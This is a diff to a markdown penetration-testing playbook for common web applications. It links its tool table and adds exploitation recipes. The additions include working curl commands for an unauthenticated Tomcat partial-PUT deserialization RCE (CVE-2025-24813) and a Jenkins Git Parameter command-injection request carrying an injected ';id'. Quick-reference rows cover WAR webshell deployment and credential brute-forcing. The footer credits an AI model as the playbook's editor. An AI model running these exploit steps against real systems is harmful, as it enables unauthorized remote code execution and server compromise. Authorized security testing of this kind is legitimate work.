@@ -12,14 +12,14 @@ Per-application playbook for the most common web apps and services encountered d
 
 | Tool | Purpose |
 |---|---|
-| `nmap` | Service discovery and version detection |
-| `eyewitness` | Screenshot all web services — `eyewitness --web -f targets.txt --no-prompt` |
-| `whatweb` / `httpx` | Technology fingerprinting — `whatweb http://target` / `httpx -l hosts.txt -tech-detect -title` |
-| `wpscan` | WordPress enumeration and vuln scanning — `wpscan --url http://target -e ap,u` |
-| `droopescan` | Drupal/Joomla/SilverStripe scanning — `droopescan scan drupal -u http://target` |
-| `joomscan` | Joomla-specific scanner — `joomscan -u http://target` |
-| `searchsploit` | Find known exploits for identified app versions |
-| `Metasploit` | Exploit modules for Tomcat, Jenkins, Splunk, Exchange, and others |
+| [[Tools/Scanning/NMAP\|nmap]] | Service discovery and version detection |
+| [[Tools/Web/eyewitness\|eyewitness]] | Screenshot all web services — `eyewitness --web -f targets.txt --no-prompt` |
+| [[Tools/Web/whatweb\|whatweb]] / [[Tools/Web/httpx\|httpx]] | Technology fingerprinting — `whatweb http://target` / `httpx -l hosts.txt -tech-detect -title` |
+| [[Tools/Web/wpscan\|wpscan]] | WordPress enumeration and vuln scanning — `wpscan --url http://target -e ap,u` |
+| [[Tools/Web/droopscan\|droopescan]] | Drupal/Joomla/SilverStripe scanning — `droopescan scan drupal -u http://target` |
+| [[Tools/Web/joomscan\|joomscan]] | Joomla-specific scanner — `joomscan -u http://target` |
+| [[Tools/Scanning/searchsploit\|searchsploit]] | Find known exploits for identified app versions |
+| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | Exploit modules for Tomcat, Jenkins, Splunk, Exchange, and others |
 
 ---
 
@@ -340,6 +340,30 @@ python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
 # Read web.xml for creds → pivot to manager upload
 ```
 
+**CVE-2025-24813 — Partial PUT deserialization RCE (unauthenticated, actively exploited):**
+
+```bash
+# Affects Tomcat 9.0.0.M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2
+# Conditions: default servlet write enabled (readonly=false) AND file-based
+# session persistence (PersistentManager + FileStore) AND a deserialization
+# gadget on the classpath. No manager creds needed.
+
+# 1. Upload a serialized Java gadget chain via partial PUT — the "."-prefixed
+#    temp name sidesteps the usual .session filename filtering
+curl -s http://target.com:8080/uploads/session -X PUT \
+  -H "Content-Range: bytes 0-/999999" \
+  --data-binary @gadget.session
+# Tomcat writes it to work/.../<name>.session
+
+# 2. Trigger deserialization by referencing the crafted session id
+curl -s http://target.com:8080/ -H "Cookie: JSESSIONID=.<name>"
+# gadget executes on read → RCE
+# Metasploit: exploit/multi/http/tomcat_partial_put_deserialization
+```
+
+> [!warning]
+> CVE-2025-24813 is on CISA KEV — mass-exploited since March 2025. The precondition (`readonly=false` on the default servlet + file session store) is uncommon in hardened installs but ships in some appliance defaults; always test the PUT write primitive first (`curl -X PUT ... /test.txt`).
+
 ### Key File Locations
 
 | Path | Purpose |
@@ -419,6 +443,17 @@ while (!s.isClosed()) {
     try { p.exitValue(); break } catch (Exception e) {}
 }
 p.destroy(); s.close()
+```
+
+**CVE-2025-53652 — Git Parameter plugin command injection:**
+
+```bash
+# Git Parameter plugin passes an unsanitized parameter value into a git command.
+# If the job is buildable without auth (or you have Job/Build), inject via the
+# parameter value → command execution on the controller/agent.
+# ~15,000 exposed instances flagged mid-2025. Patch: Git Parameter 439.v...
+# Trigger the parameterized build with a crafted value:
+curl -s "http://target.com:8080/job/<job>/buildWithParameters?GIT_PARAM=main;id"
 ```
 
 > [!note]
@@ -1334,8 +1369,10 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 | Tomcat | Brute manager creds | `msf: auxiliary/scanner/http/tomcat_mgr_login` |
 | Tomcat | WAR deploy (curl) | `curl -u tomcat:tomcat "http://target:8080/manager/text/deploy?path=/shell&update=true" --upload-file shell.war` |
 | Tomcat | Ghostcat LFI | `python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml` |
+| Tomcat | Unauth RCE (2025) | CVE-2025-24813 partial-PUT session deserialization (KEV) |
 | Jenkins | RCE | `/script` Groovy Script Console |
 | Jenkins | File read CVE | CVE-2024-23897 (CLI parser arbitrary file read) |
+| Jenkins | Git Parameter injection | CVE-2025-53652 (`buildWithParameters` unsanitized value) |
 | Splunk | REST API check | `curl -k https://target.com:8089/services/server/info` |
 | Splunk | RCE via app upload | Manage Apps → Install app from file (reverse shell app) |
 | PRTG | Command injection | CVE-2018-9276 via Notifications → execute program |
@@ -1362,5 +1399,5 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 ---
 
 *Created: 2026-03-20*
-*Updated: 2026-07-27*
-*Model: claude-sonnet-5*
+*Updated: 2026-07-30*
+*Model: claude-opus-4-8*
